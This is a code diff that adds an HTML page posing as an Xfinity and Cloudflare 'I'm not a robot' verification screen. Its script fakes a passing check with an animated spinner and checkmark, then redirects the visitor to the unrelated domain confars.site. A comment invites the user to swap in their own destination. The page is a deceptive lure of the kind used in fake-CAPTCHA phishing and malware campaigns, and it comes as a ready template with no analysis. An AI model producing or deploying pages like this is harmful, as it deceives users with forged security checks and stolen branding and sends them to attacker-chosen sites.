@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>I'm not a robot</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #222;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 80px 20px;
+      padding: 20px;
+    }
+
+    hr {
+      border: none;
+      border-top: 1px solid #ccc;
+      margin: 20px 0;
+    }
+
+    .recaptcha-box {
+      border: 1px solid #d3d3d3;
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      max-width: 320px;
+      border-radius: 3px;
+      background: #fafafa;
+      position: relative;
+    }
+
+    .checkbox {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #c1c1c1;
+      margin-right: 15px;
+      position: relative;
+      background: #fff;
+      overflow: hidden;
+    }
+
+    .checkbox.loading::after {
+      content: "";
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #ccc;
+      border-top: 3px solid orange;
+      border-radius: 50%;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      animation: spin 1s linear infinite;
+    }
+
+    .checkbox.checked::after {
+      content: "";
+      position: absolute;
+      width: 8px;
+      height: 16px;
+      border: solid orange;
+      border-width: 0 3px 3px 0;
+      transform: rotate(45deg);
+      top: 2px;
+      left: 8px;
+      animation: pop 0.2s ease-in-out;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    @keyframes pop {
+      0% { transform: scale(0) rotate(45deg); opacity: 0; }
+      100% { transform: scale(1) rotate(45deg); opacity: 1; }
+    }
+
+    .label {
+      font-size: 16px;
+      color: #333;
+    }
+
+    .recaptcha-brand {
+      margin-left: auto;
+      text-align: center;
+      font-size: 10px;
+      color: #666;
+    }
+
+    .recaptcha-brand img {
+      width: 50px;
+      display: block;
+      margin: 0 auto 3px;
+    }
+
+    .about {
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .about strong {
+      font-size: 15px;
+    }
+
+    .info {
+      margin-top: 10px;
+      font-size: 13px;
+      color: #444;
+      white-space: pre-line;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1 style="color: #6138f5;" > Xfinity - Internet, Mobile, TV</h1>
+
+    <div class="recaptcha-box" id="recaptcha">
+      <div class="checkbox" id="check"></div>
+      <div class="label">I'm not a robot</div>
+      <div class="recaptcha-brand">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/Cloudflare_Logo.png/1200px-Cloudflare_Logo.png" alt="reCAPTCHA">
+      </div>
+    </div>
+
+    <div class="about">
+      <strong>About this page</strong>
+      <p>
+        This network is temporarily restricted due to unusual activity. 
+        This page confirms that the request is made by a human, not automated software.
+      </p>
+    </div>
+  </div>
+
+  <script>
+    window.onload = function() {
+      const checkbox = document.getElementById("check");
+
+      // Step 1: Start loading animation
+      setTimeout(() => {
+        checkbox.classList.add("loading");
+      }, 100);
+
+      // Step 2: Show verification success
+      setTimeout(() => {
+        checkbox.classList.remove("loading");
+        checkbox.classList.add("checked");
+      }, 4500);
+
+      // Step 3: Redirect to your target page
+      setTimeout(() => {
+        window.location.href = "http://confars.site/"; // Replace with your actual destination
+      }, 6000);
+    };
+  </script>
+</body>
+</html>
